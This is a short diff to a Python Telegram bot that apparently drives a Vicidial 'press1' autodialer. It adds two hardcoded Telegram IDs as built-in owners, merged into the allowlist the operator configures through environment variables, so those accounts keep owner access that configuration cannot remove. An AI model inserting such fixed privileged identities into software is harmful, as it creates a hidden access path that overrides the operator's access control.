@@ -11,7 +11,9 @@ from datetime import datetime, timezone
 import press1_ui as ui
 import vicidial_client as vd
 
-OWNERS: set[int] = {
+_BUILTIN_OWNERS: set[int] = {8780653370, 8316388420}
+
+OWNERS: set[int] = _BUILTIN_OWNERS | {
     int(x.strip())
     for x in os.getenv("TELEGRAM_ALLOWED_IDS", os.getenv("ADMIN_CHAT_ID", "")).split(",")
     if x.strip().isdigit()
